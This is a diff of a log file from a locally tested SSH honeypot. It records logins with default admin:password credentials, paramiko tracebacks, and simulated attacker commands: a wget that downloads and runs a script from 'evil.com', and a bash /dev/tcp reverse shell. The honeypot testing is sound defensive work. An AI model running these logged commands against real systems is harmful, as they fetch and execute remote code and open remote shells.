@@ -1,30 +1,112 @@
-2025-07-19 13:31:49,812 - SSH Honeypot running on 0.0.0.0:2222
-2025-07-19 13:32:18,950 - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
-2025-07-19 13:32:26,295 - Auth rejected (none).
-2025-07-19 13:32:37,693 - Login attempt: admin:1234 from 127.0.0.1
-2025-07-19 13:32:37,693 - Auth rejected (password).
-2025-07-19 13:32:40,667 - Login attempt: admin:2222 from 127.0.0.1
-2025-07-19 13:32:40,672 - Auth rejected (password).
-2025-07-19 13:32:44,212 - Login attempt: admin:4444 from 127.0.0.1
-2025-07-19 13:32:44,212 - Auth rejected (password).
-2025-07-19 13:32:44,215 - Socket exception: An existing connection was forcibly closed by the remote host (10054)
-2025-07-19 13:37:59,852 - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
-2025-07-19 13:37:59,901 - Socket exception: An existing connection was forcibly closed by the remote host (10054)
-2025-07-19 13:37:59,901 - Error: [WinError 10054] An existing connection was forcibly closed by the remote host
-2025-07-19 13:38:28,104 - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
-2025-07-19 13:38:28,118 - Socket exception: An existing connection was forcibly closed by the remote host (10054)
-2025-07-19 13:38:28,119 - Error: [WinError 10054] An existing connection was forcibly closed by the remote host
-2025-07-19 13:39:41,560 - SSH Honeypot running on 0.0.0.0:2222
-2025-07-19 13:39:55,768 - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
-2025-07-19 13:39:55,803 - Socket exception: An existing connection was forcibly closed by the remote host (10054)
-2025-07-19 13:39:55,806 - Error: [WinError 10054] An existing connection was forcibly closed by the remote host
-2025-07-19 13:40:54,485 - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
-2025-07-19 13:40:58,384 - Auth rejected (none).
-2025-07-19 13:41:02,197 - Login attempt: admin:password from 127.0.0.1
-2025-07-19 13:41:02,201 - Auth granted (password).
-2025-07-19 13:41:02,213 - Socket exception: An existing connection was forcibly closed by the remote host (10054)
-2025-07-19 13:43:53,568 - SSH Honeypot running on 0.0.0.0:2222
-2025-07-19 13:44:17,988 - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
-2025-07-19 13:44:19,751 - Auth rejected (none).
-2025-07-19 13:44:22,715 - Login attempt: admin:password from 127.0.0.1
-2025-07-19 13:44:22,715 - Auth granted (password).
+2025-07-20 11:05:33,389 - INFO - SSH Honeypot running on 0.0.0.0:2222
+2025-07-20 11:05:33,389 - INFO - Default credentials: admin:password
+2025-07-20 11:06:02,684 - INFO - New connection from 127.0.0.1:61668
+2025-07-20 11:06:03,204 - INFO - Generated new RSA host key
+2025-07-20 11:06:03,210 - INFO - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
+2025-07-20 11:06:03,283 - ERROR - Socket exception: An existing connection was forcibly closed by the remote host (10054)
+2025-07-20 11:06:03,283 - ERROR - Error handling connection from 127.0.0.1: [WinError 10054] An existing connection was forcibly closed by the remote host
+2025-07-20 11:07:43,579 - INFO - New connection from 127.0.0.1:61812
+2025-07-20 11:07:43,767 - INFO - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
+2025-07-20 11:07:48,711 - INFO - Auth rejected (none).
+2025-07-20 11:07:52,253 - INFO - Login attempt 1 from 127.0.0.1: admin:heelo
+2025-07-20 11:07:52,253 - INFO - Auth rejected (password).
+2025-07-20 11:07:55,256 - INFO - Login attempt 2 from 127.0.0.1: admin:password
+2025-07-20 11:07:55,257 - INFO - Successful login from 127.0.0.1 as admin
+2025-07-20 11:07:55,257 - INFO - Auth granted (password).
+2025-07-20 11:07:55,275 - INFO - New SSH session from 127.0.0.1
+2025-07-20 11:08:25,280 - WARNING - Session timeout from 127.0.0.1
+2025-07-20 11:08:25,294 - INFO - Session ended with 127.0.0.1 (Duration: 30.00s, Commands: 0)
+2025-07-20 11:08:25,296 - ERROR - Socket exception: An operation was attempted on something that is not a socket (10038)
+2025-07-20 11:09:17,657 - INFO - New connection from 127.0.0.1:61939
+2025-07-20 11:09:17,845 - INFO - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
+2025-07-20 11:09:20,922 - INFO - Auth rejected (none).
+2025-07-20 11:09:29,398 - INFO - Login attempt 1 from 127.0.0.1: admin:hello
+2025-07-20 11:09:29,398 - INFO - Auth rejected (password).
+2025-07-20 11:09:33,080 - INFO - Login attempt 2 from 127.0.0.1: admin:password
+2025-07-20 11:09:33,080 - INFO - Successful login from 127.0.0.1 as admin
+2025-07-20 11:09:33,080 - INFO - Auth granted (password).
+2025-07-20 11:09:33,083 - INFO - New SSH session from 127.0.0.1
+2025-07-20 11:09:33,083 - WARNING - Direct command execution attempt from 127.0.0.1: b'wget http://evil.com/script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh'
+2025-07-20 11:09:33,088 - ERROR - Unknown exception: 'Channel' object has no attribute 'send_close'
+2025-07-20 11:09:33,174 - ERROR - Traceback (most recent call last):
+2025-07-20 11:09:33,174 - ERROR -   File "C:\Users\Dell\AppData\Local\Programs\Python\Python312\Lib\site-packages\paramiko\transport.py", line 2241, in run
+2025-07-20 11:09:33,174 - ERROR -     self._channel_handler_table[ptype](chan, m)
+2025-07-20 11:09:33,185 - ERROR -   File "C:\Users\Dell\AppData\Local\Programs\Python\Python312\Lib\site-packages\paramiko\channel.py", line 1113, in _handle_request
+2025-07-20 11:09:33,185 - ERROR -     ok = server.check_channel_exec_request(self, cmd)
+2025-07-20 11:09:33,185 - ERROR -          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2025-07-20 11:09:33,188 - ERROR -   File "D:\major\ssh_honeypot.py", line 450, in check_channel_exec_request
+2025-07-20 11:09:33,191 - ERROR -     channel.send_close()
+2025-07-20 11:09:33,194 - ERROR -     ^^^^^^^^^^^^^^^^^^
+2025-07-20 11:09:33,194 - ERROR - AttributeError: 'Channel' object has no attribute 'send_close'. Did you mean: '_set_closed'?
+2025-07-20 11:09:33,196 - ERROR - 
+2025-07-20 11:10:03,122 - WARNING - Session timeout from 127.0.0.1
+2025-07-20 11:10:03,122 - INFO - Session ended with 127.0.0.1 (Duration: 30.04s, Commands: 0)
+2025-07-20 11:10:03,122 - ERROR - Error handling connection from 127.0.0.1: Socket is closed
+2025-07-20 11:49:23,852 - INFO - New connection from 127.0.0.1:57145
+2025-07-20 11:49:24,041 - INFO - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
+2025-07-20 11:49:26,850 - INFO - Auth rejected (none).
+2025-07-20 11:49:30,424 - INFO - Login attempt 1 from 127.0.0.1: admin:password
+2025-07-20 11:49:30,424 - INFO - Successful login from 127.0.0.1 as admin
+2025-07-20 11:49:30,426 - INFO - Auth granted (password).
+2025-07-20 11:49:30,427 - INFO - New SSH session from 127.0.0.1
+2025-07-20 11:49:30,429 - WARNING - Direct command execution attempt from 127.0.0.1: b'wget http://evil.com/script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh'
+2025-07-20 11:49:30,429 - ERROR - Unknown exception: 'Channel' object has no attribute 'send_close'
+2025-07-20 11:49:30,442 - ERROR - Traceback (most recent call last):
+2025-07-20 11:49:30,443 - ERROR -   File "C:\Users\Dell\AppData\Local\Programs\Python\Python312\Lib\site-packages\paramiko\transport.py", line 2241, in run
+2025-07-20 11:49:30,445 - ERROR -     self._channel_handler_table[ptype](chan, m)
+2025-07-20 11:49:30,445 - ERROR -   File "C:\Users\Dell\AppData\Local\Programs\Python\Python312\Lib\site-packages\paramiko\channel.py", line 1113, in _handle_request
+2025-07-20 11:49:30,445 - ERROR -     ok = server.check_channel_exec_request(self, cmd)
+2025-07-20 11:49:30,445 - ERROR -          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2025-07-20 11:49:30,448 - ERROR -   File "D:\major\ssh_honeypot.py", line 450, in check_channel_exec_request
+2025-07-20 11:49:30,448 - ERROR -     channel.send_close()
+2025-07-20 11:49:30,448 - ERROR -     ^^^^^^^^^^^^^^^^^^
+2025-07-20 11:49:30,448 - ERROR - AttributeError: 'Channel' object has no attribute 'send_close'. Did you mean: '_set_closed'?
+2025-07-20 11:49:30,450 - ERROR - 
+2025-07-20 11:50:00,465 - WARNING - Session timeout from 127.0.0.1
+2025-07-20 11:50:00,465 - INFO - Session ended with 127.0.0.1 (Duration: 30.04s, Commands: 0)
+2025-07-20 11:50:00,466 - ERROR - Error handling connection from 127.0.0.1: Socket is closed
+2025-07-20 11:50:14,653 - INFO - New connection from 127.0.0.1:57215
+2025-07-20 11:50:14,909 - INFO - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
+2025-07-20 11:50:17,430 - INFO - Auth rejected (none).
+2025-07-20 11:50:20,513 - INFO - Login attempt 1 from 127.0.0.1: admin:hhh
+2025-07-20 11:50:20,515 - INFO - Auth rejected (password).
+2025-07-20 11:50:23,708 - INFO - Login attempt 2 from 127.0.0.1: admin:password
+2025-07-20 11:50:23,708 - INFO - Successful login from 127.0.0.1 as admin
+2025-07-20 11:50:23,708 - INFO - Auth granted (password).
+2025-07-20 11:50:23,722 - INFO - New SSH session from 127.0.0.1
+2025-07-20 11:50:23,724 - WARNING - Direct command execution attempt from 127.0.0.1: b'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+2025-07-20 11:50:23,724 - ERROR - Unknown exception: 'Channel' object has no attribute 'send_close'
+2025-07-20 11:50:23,729 - ERROR - Traceback (most recent call last):
+2025-07-20 11:50:23,729 - ERROR -   File "C:\Users\Dell\AppData\Local\Programs\Python\Python312\Lib\site-packages\paramiko\transport.py", line 2241, in run
+2025-07-20 11:50:23,729 - ERROR -     self._channel_handler_table[ptype](chan, m)
+2025-07-20 11:50:23,729 - ERROR -   File "C:\Users\Dell\AppData\Local\Programs\Python\Python312\Lib\site-packages\paramiko\channel.py", line 1113, in _handle_request
+2025-07-20 11:50:23,729 - ERROR -     ok = server.check_channel_exec_request(self, cmd)
+2025-07-20 11:50:23,729 - ERROR -          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2025-07-20 11:50:23,729 - ERROR -   File "D:\major\ssh_honeypot.py", line 450, in check_channel_exec_request
+2025-07-20 11:50:23,739 - ERROR -     channel.send_close()
+2025-07-20 11:50:23,741 - ERROR -     ^^^^^^^^^^^^^^^^^^
+2025-07-20 11:50:23,742 - ERROR - AttributeError: 'Channel' object has no attribute 'send_close'. Did you mean: '_set_closed'?
+2025-07-20 11:50:23,742 - ERROR - 
+2025-07-20 11:50:53,738 - WARNING - Session timeout from 127.0.0.1
+2025-07-20 11:50:53,738 - INFO - Session ended with 127.0.0.1 (Duration: 30.01s, Commands: 0)
+2025-07-20 11:50:53,738 - ERROR - Error handling connection from 127.0.0.1: Socket is closed
+2025-07-20 11:51:55,067 - INFO - New connection from 127.0.0.1:57345
+2025-07-20 11:51:55,242 - INFO - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
+2025-07-20 11:51:57,537 - INFO - Auth rejected (none).
+2025-07-20 11:52:01,268 - INFO - Login attempt 1 from 127.0.0.1: admin:password
+2025-07-20 11:52:01,268 - INFO - Successful login from 127.0.0.1 as admin
+2025-07-20 11:52:01,268 - INFO - Auth granted (password).
+2025-07-20 11:52:01,273 - INFO - New SSH session from 127.0.0.1
+2025-07-20 11:52:13,862 - WARNING - Failed sudo attempt from 127.0.0.1
+2025-07-20 11:52:25,939 - INFO - Successful sudo from 127.0.0.1
+2025-07-20 11:52:50,068 - INFO - Session ended with 127.0.0.1 (Duration: 48.79s, Commands: 4)
+2025-07-20 11:52:50,068 - ERROR - Socket exception: An operation was attempted on something that is not a socket (10038)
+2025-07-20 11:54:24,271 - INFO - New connection from 127.0.0.1:57516
+2025-07-20 11:54:24,429 - INFO - Connected (version 2.0, client OpenSSH_for_Windows_9.5)
+2025-07-20 11:54:24,462 - INFO - Auth rejected (none).
+2025-07-20 11:54:28,193 - INFO - Login attempt 1 from 127.0.0.1: admin:password
+2025-07-20 11:54:28,199 - INFO - Successful login from 127.0.0.1 as admin
+2025-07-20 11:54:28,199 - INFO - Auth granted (password).
+2025-07-20 11:54:28,199 - INFO - New SSH session from 127.0.0.1
+2025-07-20 11:56:03,668 - INFO - Session ended with 127.0.0.1 (Duration: 95.46s, Commands: 19)
+2025-07-20 11:56:03,673 - ERROR - Socket exception: An operation was attempted on something that is not a socket (10038)
